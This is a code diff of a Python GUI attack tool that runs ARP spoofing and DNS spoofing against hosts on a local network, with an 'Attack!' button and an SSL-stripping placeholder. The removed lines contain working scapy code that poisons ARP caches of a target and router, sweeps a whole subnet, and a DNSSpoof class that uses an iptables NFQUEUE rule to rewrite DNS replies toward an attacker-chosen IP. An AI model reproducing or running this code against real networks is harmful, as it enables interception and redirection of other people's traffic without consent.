@@ -5,6 +5,8 @@ import os
 import logging as logging
 from netfilterqueue import NetfilterQueue
 import threading
+import ARP
+import dns4
 
 # setconfigfile("estctwist.nl", "/etc/nginx/sites-enabled/default.conf")
 def setconfigfile(website, path):
@@ -32,8 +34,12 @@ hostIp = RouterIP #host = router
 includeSSL = False
 guessIP = '10.0.123.'
 silent = True
-website = 'google.com'
+website = "google.com"
 path = 'default'
+inf = 'enp0s10'
+websiteSSL = "google.com."
+spoofIP = "157.240.201.35"
+queueNum = 1
 
 choice1 = sg.Checkbox("SSL Stripping", default=False)
 t1 = sg.Input('', enable_events=True, key='-INPUT-', font=('Arial Bold', 20), justification='left')
@@ -44,9 +50,7 @@ t5 = sg.Input('', enable_events=True, key='-INPUT5-', font=('Arial Bold', 20), j
 t6 = sg.Input('', enable_events=True, key='-INPUT6-', font=('Arial Bold', 20), justification='left')
 t7 = sg.Input('', enable_events=True, key='-INPUT7-', font=('Arial Bold', 20), justification='left')
 
-
 choice2 = sg.Checkbox("ARP Silent mode", default=False)
-
 text1 = sg.Text("Do you want to include SSL stripping?")
 text2 = sg.Text("Insert target IP")
 text3 = sg.Text("Insert target domain")
@@ -58,137 +62,49 @@ text7 = sg.Text("Enter website (SSL)")
 text8 = sg.Text("Enter path (SSL)")
 
 endButton = sg.Button("End attack", visible = False)
-    
 attackButton = sg.Button("Attack!")
     
-layout = [[choice1], [choice2], [text2], [t1], [text3], [t2], [text4], [t3], [text5], [t4], [text6], [t5], [text7], [t6], [text8], [t7] [attackButton], [endButton]]
+layout = [[choice1], [choice2], [text2], [t1], [text3], [t2], [text4], [t3], [text5], [t4], [text6], [t5], [text7], [t6], [text8], [t7], [attackButton], [endButton]]
 window = sg.Window("Attack", layout)
 
-def spoof(targetIp, hostIp, attackerIp):
-
-    targetMac = getmacbyip(targetIp)
-    attackerMac = get_if_hwaddr('enp0s10') #get attacker MAC
-    hostMac = getmacbyip(hostIp)
-    
-    #send packet "host" to server    
-    arp = Ether() / ARP()
-    arp[Ether].src = attackerMac
-    arp[ARP].hwsrc = attackerMac
-    arp[ARP].psrc = hostIp
-    arp[ARP].hwdst = targetMac
-    arp[ARP].pdst = targetIp
-        
-    sendp(arp, iface="enp0s10")
-    
-    #send packet "server" to host
-    arp2 = Ether() / ARP()
-    arp2[Ether].src = attackerMac
-    arp2[ARP].hwsrc = attackerMac
-    arp2[ARP].psrc = targetIp
-    arp2[ARP].hwdst = hostMac
-    arp2[ARP].pdst = hostIp
-
-    sendp(arp2, iface="enp0s10")
-    
-def full_spoof(targetIP, hostIP, attackerIP):
-    #loop trough every ip that could be on your network and be the MITM on all of them
-    for x in range(0, 255):
-        y = str(x)
-        targetIP = targetIP + y
-        spoof(targetIP, hostIP, attackerIP)
-        targetIP = guessIP
-        
-        
-def end_spoof(targetIp, hostIp, attackerIp):
-        
-    targetMac = getmacbyip(targetIp)
-    attackerMac = getmacbyip(attackerIp)
-    hostMac = getmacbyip(hostIp)
-        
-    #undo ARP spoofing
-    correctARP = Ether() / ARP()
-    correctARP[Ether].src = attackerMac
-    correctARP[ARP].hwsrc = hostMac
-    correctARP[ARP].psrc = hostIp
-    correctARP[ARP].hwdst = targetMac
-    correctARP[ARP].pdst = targetIp
-    sendp(correctARP, iface="enp0s10")
- 
-website = "google.com."
-spoofIP = "157.240.201.35"
-queueNum = 1
-
-class DNSSpoof:
-    def __init__(self, website, spoofIP, queueNum):
-        self.website = website
-        self.spoofIP = spoofIP
-        self.queueNum = queueNum
-        self.queue = NetfilterQueue()
- 
-    def __call__(self):
-        print("Spoofing....")
-        #{self.queueNum}
-        os.system('sudo iptables -I FORWARD -d 10.0.123.4 -j NFQUEUE --queue-num 1')
-        self.queue.bind(self.queueNum, self.poison)
-        try:
-            self.queue.run()
-            print 'queue run: '
-        except KeyboardInterrupt:
-            os.system('sudo iptables -D FORWARD -j NFQUEUE --queue-num 1')
-            print("[!] iptable rule flushed")
- 
-    def poison(self, packet):
-        scapyPacket = IP(packet.get_payload())
-        if scapyPacket.haslayer(DNSRR):
-            try:
-                queryName = scapyPacket[DNSQR].qname
-                if queryName in self.website:
-                    scapyPacket[DNS].an = DNSRR(
-                        rrname=queryName, rdata=self.spoofIP)
-                    scapyPacket[DNS].ancount = 1
-                    del scapyPacket[IP].len
-                    del scapyPacket[IP].chksum
-                    del scapyPacket[UDP].len
-                    del scapyPacket[UDP].chksum
-                    del scapyPacket[Ether].chksum
-                    print "modified", queryName
-                    packet.set_payload(bytes(scapyPacket))
-                else:
-                    print("not modified")
-            except IndexError as error:
-                log.error(error)
-            packet.set_payload(bytes(scapyPacket))
-        return packet.accept()
- 
-def DNSLoop():        
-    if __name__ == '__main__':
-        try:
-            #ip adresses that we want to spoof
-            spoof = DNSSpoof(website, spoofIP, queueNum)
-            spoof()
-        except OSError as error:
-            log.error(error)
-
-
 def ARPLoop():
-    try: #different thread
-    
+    try:
         while True:
-        
             if silent == False:
-                full_spoof(guessIp, hostIp, attackerIp)
+                ARP.full_spoof(guessIP, hostIp, attackerIp, inf)
             else:
-                spoof(targetIp, hostIp, attackerIp)
+                ARP.spoof(targetIp, hostIp, attackerIp, inf)
             time.sleep(2)
             
     except KeyboardInterrupt:
         print('stopping attack')
-        end_spoof(targetIp, hostIp, attackerIp)
-        end_spoof(hostIp, targetIp, attackerIp)
+        ARP.end_spoof(targetIp, hostIp, attackerIp, inf)
+        ARP.end_spoof(hostIp, targetIp, attackerIp, inf)
+ 
+def DNSLoop():        
+    if __name__ == '__main__':
+        try:
+            print website
+            spoof = dns4.DNSSpoof(website, spoofIP, queueNum, targetIp)
+            spoof()
+        except OSError as error:
+            log.error(error)
 
 def SSLLoop():
     #SSL code
     print("SSL Test")
+
+def guess(targetIP):
+    y = 0
+    z = 0
+    for x in targetIP:
+        if x in ["."]:
+            y = y + 1
+        if y == 3:
+            z = z + 1
+    z = z - 1
+    guessIP = targetIP[:-z]
+    return guessIP
 
 while True:
     event, values = window.read()
@@ -201,10 +117,14 @@ while True:
         hostIp = RouterIP
         website = layout[9][0].get()
         spoofIP = layout[11][0].get()
-        website = layout[13][0].get()
+        websiteSSL = layout[13][0].get()
         path = layout[15][0].get()
+        guessIP = guess(TargetIP)
+        inf = layout[7][0].get()
         
         attackerIp = get_if_addr(layout[7][0].get())
+        
+        print includeSSL, silent, TargetIP, RouterIP, website, spoofIP, websiteSSL, path, guessIP, inf
         
         thread1 = threading.Thread(target=ARPLoop);
         thread1.start(); 
@@ -221,7 +141,7 @@ while True:
         window['Attack!'].update(visible = False)
         
     if event == "End attack" or event == None:
-        end_spoof(targetIp, hostIp, attackerIp)
-        end_spoof(hostIp, targetIp, attackerIp)   
+        ARP.end_spoof(targetIp, hostIp, attackerIp, inf)
+        ARP.end_spoof(hostIp, targetIp, attackerIp, inf)   
         
 window.close()
